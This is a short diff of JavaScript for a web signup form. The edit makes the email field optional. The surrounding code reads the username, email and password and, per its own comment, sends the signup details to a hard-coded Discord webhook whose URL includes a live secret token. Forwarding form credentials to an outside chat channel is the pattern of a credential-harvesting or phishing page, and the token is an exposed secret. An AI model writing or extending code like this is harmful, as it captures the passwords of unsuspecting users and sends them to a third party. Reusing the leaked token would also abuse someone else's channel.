@@ -22,10 +22,10 @@ document.querySelector("form").addEventListener("submit", function(event) {
     event.preventDefault();  // Prevent the default form submission
 
     const username = document.getElementById('username').value;
-    const email = document.getElementById('email').value;
+    const email = document.getElementById('email').value || "None";  // If email is empty, use "None"
     const password = document.getElementById('password').value;
 
-    if (username && email && password) {
+    if (username && password) {
         // Send signup details to Discord webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
         const payload = {
